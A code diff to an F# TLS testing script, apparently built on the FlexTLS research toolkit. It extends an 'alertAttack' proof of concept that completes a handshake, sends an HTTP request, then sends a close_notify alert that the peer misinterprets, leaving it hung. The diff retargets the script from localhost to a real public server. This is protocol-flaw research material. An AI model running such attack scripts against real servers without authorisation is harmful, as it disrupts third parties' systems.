@@ -12,6 +12,7 @@ open FlexClientKeyExchange
 open FlexCCS
 open FlexFinished
 open FlexRecord
+open FlexAppData
 
 open Bytes
 open TLSInfo
@@ -48,10 +49,30 @@ let alertAttack peer name =
     let st,fsf       = FlexFinished.receive(st) in
 
     // RSA handshake is over. Send some plaintext
-    //let _ = FlexRecord.send()
+    let request = sprintf "GET / HTTP/1.1\r\nConnection: Keep-Alive\r\n\r\n" in
+    let st = FlexAppData.send(st,request) in
+    printf "---> %s" request;
+    let st,b = FlexAppData.receive(st) in
+    let response = System.Text.Encoding.ASCII.GetString(cbytes b) in
+    printf "<--- %s" response;
+    let st,b = FlexAppData.receive(st) in
+    let response = System.Text.Encoding.ASCII.GetString(cbytes b) in
+    printf "<--- %s" response;
+
+    // Close a connection by sending a close_notify alert
+    let st = FlexAlert.send(st,TLSError.AD_close_notify) in
+
+    (* *** Here we'd expect either a close_notify from the peer,
+           or the connection to be shut down.
+           However, the peer mis-interpreted our alert, and is now
+           waiting for more data. *)
+    printf "Sending close notify. Going to hang...\n"
+    let st,ad = FlexAlert.receive(st) in
+    printf "Alert: %A" ad;
+    ignore (System.Console.ReadLine());
     ()
 
 [<EntryPoint>]
 let main argv = 
-    alertAttack "localhost" "localhost"
+    alertAttack "www.inria.fr" "www.inria.fr"
     0
